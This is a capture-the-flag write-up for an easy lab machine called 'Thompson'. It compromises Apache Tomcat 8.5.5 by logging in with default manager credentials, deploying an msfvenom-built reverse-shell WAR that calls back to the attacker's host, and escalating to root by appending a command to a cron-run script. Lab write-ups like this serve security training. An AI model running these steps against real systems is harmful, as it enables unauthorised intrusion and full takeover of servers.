# Thompson - Easy

* nmap scan - ```nmap -T4 -p- -A -Pn -v 10.10.55.78``` - reveals open ports & services:

  * 22/tcp - ssh - OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  * 8009/tcp - ajp13 - Apache Jserv (Protocol v1.3)
  * 8080/tcp - http - Apache Tomcat 8.5.5
  * 13003/tcp - unknown

* Navigating to <http://10.10.55.78:8080> leads us to homepage for Apache Tomcat/8.5.5

* Searching for exploits associated with this gives us an exploit for CVE-2017-12617, but that does not work

* For the page on port 8080, when we try accessing the manager apps, we get an authentication prompt; this leads us to a ```401 Unauthorized``` page

* This page mentions default credentials 'tomcat:s3cret'; using these creds, we get access to the Tomcat webapp manager

* The manager page also includes a WAR file upload option; we can try searching for more related exploits

* [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#rce) has some neat methods to get RCE; we can use the Metasploit one, but it does not work

* We can craft a malicious '.war' file using ```msfvenom```:

  ```sh
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.14.25.65 LPORT=1234 -f war -o revshell.war

  nc -nvlp 1234
  # setup listener
  ```

* Back in manager page, once we deploy the WAR file after uploading it, we can access it at '/revshell' (included in the Applications table); on our listener, we get reverse shell:

  ```sh
  which python
  # we have python on target machine

  python -c 'import pty;pty.spawn("/bin/bash")'
  # temporary shell

  id
  # we are 'tomcat' user

  pwd

  ls /home
  # we have a user 'jack'

  ls -la /home/jack
  # get user flag

  # we also have a script here
  cat /home/jack/id.sh
  # this runs a command as root
  # and prints it to a .txt file

  # to confirm this
  cat /etc/crontab
  # this shows root is running the script every minute

  echo "cat /root/root.txt >> test.txt" >> /home/jack/id.sh
  # modify the script running as root

  cat /home/jack/id.sh
  # confirm the change

  cat /home/jack/test.txt
  # includes root flag now
  ```
